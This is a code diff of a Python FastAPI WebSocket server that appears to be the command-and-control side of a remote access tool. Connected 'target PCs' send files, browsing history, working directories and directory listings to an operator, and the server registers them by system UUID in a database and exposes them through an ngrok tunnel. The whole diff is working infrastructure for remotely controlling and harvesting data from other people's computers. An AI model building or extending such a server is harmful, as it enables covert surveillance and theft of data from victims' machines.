@@ -1,12 +1,16 @@
 import asyncio
+import pprint
 import time
 
+import starlette
 from fastapi import FastAPI, WebSocket
 # from fastapi.security import APIKeyHeader
 from starlette.middleware.cors import CORSMiddleware
 from starlette.websockets import WebSocketDisconnect
 
-from utils import receive_file, is_client_admin, today
+import utils
+from database import crud
+from database.db import create_db_and_tables
 
 # app
 app = FastAPI(
@@ -97,8 +101,13 @@ async def handle_client_interaction(client_websocket: WebSocket, admin_websocket
 async def websocket_endpoint_client(websocket: WebSocket):
     await websocket.accept()
     client_id = len(clients) + 1
-    clients[client_id] = websocket
+    clients[client_id] = {"ws": websocket}
     try:
+        get_username = await websocket.receive_text()
+        if get_username.lower().startswith(".%."):
+            client_data = await websocket.receive_json()
+            clients[client_id]["client_data"] = client_data
+
         while True:
             client_data = await websocket.receive_text()
 
@@ -106,14 +115,14 @@ async def websocket_endpoint_client(websocket: WebSocket):
                 print("receive file")
                 _, filename = client_data.split(' ', 1)
                 # Use asyncio to concurrently receive file in the background
-                response = await asyncio.create_task(receive_file(websocket, filename))
+                response = await asyncio.create_task(utils.receive_file(websocket, filename))
                 await admin_websocket.send_json({"client": client_id, "response": str(response)})
                 continue
 
             elif client_data.lower().startswith('history'):
                 hist = await websocket.receive_json()
                 data = {"client": client_id,
-                        "today": today(),
+                        "today": utils.today(),
                         "hist": hist}
                 await admin_websocket.send_json(data)
                 continue
@@ -121,7 +130,16 @@ async def websocket_endpoint_client(websocket: WebSocket):
             elif client_data.lower().startswith('cwd%`'):
                 cwd = client_data[5:]
                 client_data = await websocket.receive_json()
-                await admin_websocket.send_json({"client": client_id, "cwd": cwd, "client_data": client_data})
+
+                status = crud.add_target_pc(client_data)
+                if status == "%&%":
+                    await admin_websocket.send_json({"client": client_id, "cwd": cwd, "client_data": client_data})
+                else:
+                    if status.username_changed:
+                        client_data["username"] = status.updated_username
+                    else:
+                        client_data["username"] = status.username
+                    await admin_websocket.send_json({"client": client_id, "cwd": cwd, "client_data": client_data})
                 continue
 
             elif client_data.lower().startswith("ls"):
@@ -131,8 +149,7 @@ async def websocket_endpoint_client(websocket: WebSocket):
 
             await admin_websocket.send_json({"client": client_id, "response": client_data})
     except:
-        pass
-        # del clients[client_id]
+        del clients[client_id]
 
 
 @app.websocket("/ws-remote-access/admin")
@@ -146,7 +163,7 @@ async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_i
             "Please provide a valid client_id to connect with \nFind details: https://0.tcp.ap.ngrok.io:<enter-port>/get-clients")
         await admin_websocket.close(code=1000)  # Close the WebSocket connection gracefully
         return
-    if await is_client_admin(api_key):
+    if await utils.is_client_admin(api_key):
         switched = False
         try:
             while not switched:
@@ -154,7 +171,7 @@ async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_i
                 selected_index = int(client_id) - 1
                 if 0 <= selected_index < len(clients):
                     selected_client_id = list(clients.keys())[selected_index]
-                    client_ws = clients[selected_client_id]
+                    client_ws = clients[selected_client_id]['ws']
 
                 while await handle_client_interaction(client_ws, websocket):
                     switched = True
@@ -170,22 +187,56 @@ async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_i
 
 
 @app.get("/get-clients")
-async def test():
+async def get_clients():
     message = {}
     message["clients"] = []
-    for i, (client_id, client_ws) in enumerate(clients.items()):
-        # Create a dictionary to hold client information
-        client_info = {"client_id": str(i+1),
-                       "address": f"{client_ws.client.host}:{client_ws.client.port}"
-                       }
-        message["clients"].append(client_info)
+
+    for client_id, client_info in clients.items():
+        # Check if the current item represents a WebSocket client
+        if "ws" in client_info:
+            client_ws = client_info["ws"]
+            # Create a dictionary to hold client information
+            client_data = client_info.get("client_data", {})
+
+            db_registered_pc = crud.add_target_pc(client_data)
+            if db_registered_pc.username_changed:
+                client_data["username"] = db_registered_pc.updated_username
+            else:
+                client_data["username"] = db_registered_pc.username
+
+            client_info = {
+                "client_id": client_id,
+                "address": f"{client_ws.client.host}:{client_ws.client.port}",
+                "username": client_data['username'],
+                "system_uuid": client_data['system_uuid']
+            }
+            message["clients"].append(client_info)
+
     return message
 
 
+@app.patch("/update-username/{system_uuid}")
+def update_username(system_uuid: str, new_username: str):
+    """
+    :param new_username: The new username to be updated.
+    :param system_uuid: The unique identifier of the system.
+    :return: A dictionary containing the status of the update operation.
+    """
+    try:
+        status = crud.update_username(new_username, system_uuid)
+        if status:
+            return {'success': True, 'message': "Client Name Updated Successfully", 'status': 200}  # Successful update
+        else:
+            return {'success': False, 'error': 'Invalid UUID', 'status': 404}  # Invalid UUID
+    except Exception as e:
+        return {'success': False, 'error': str(e), 'status': 500}  # Server error
+
+
 if __name__ == "__main__":
+    create_db_and_tables()
     import uvicorn
 
-    uvicorn.run(app, host="127.0.0.1", port=8000, ssl_keyfile='./server.key',
+    uvicorn.run(app, host="192.168.1.114", port=8000, ssl_keyfile='./server.key',
                 ssl_certfile='./server.crt',
                 log_level="info")
 
